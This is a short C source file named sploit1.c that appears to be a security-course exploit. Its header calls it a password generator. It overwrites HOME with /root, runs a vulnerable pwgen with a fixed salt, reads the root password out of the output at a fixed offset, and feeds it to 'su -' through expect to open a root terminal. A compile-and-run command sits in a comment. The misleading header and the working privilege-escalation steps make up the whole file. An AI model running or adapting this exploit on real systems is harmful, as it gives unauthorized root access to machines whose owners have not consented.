/*
 * A program that randomly generates a password and sets that as your 
password
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


#define BUFFER 1000
#define PASS_SIZE 8
// cd /share && gcc -Wall -ggdb sploit1.c -o /home/user/sploit1 && ~/sploit1

// Main
int main(int argc, char* argv[]) {
    FILE *output;
    char msg[1024];
    char buffer[BUFFER];
    char pass[PASS_SIZE+1];
    printf("overwriteing environment HOME to /root ... \n");
    putenv("HOME=/root"); // overwrite environment

 
    printf("calling [pwgen] ... \n");
    output = popen("pwgen --salt=12345 -w <<< \"u\"", "r");
    printf("completed [pwgen] ... \n");

    if (output == NULL) {
        fputs("POPEN failed \n", stderr);
    }
    else {
        int count = 0;
        while(fgets(buffer, BUFFER-1, output) != NULL){
            if (count == 3) {
                memcpy(pass, &buffer[31], 8);
                pass[PASS_SIZE] = '\0';
                printf("password: %s \n", pass);
            }
            count ++;
        }
    }

    pclose(output);
    printf("password is retrieved! opening the root terminal through su ...\n");

    snprintf(msg, 1024, "expect -c \'spawn su - ;expect Password:;send \"%s\n\";interact\'", pass);
    system(msg);
    return 0;
}
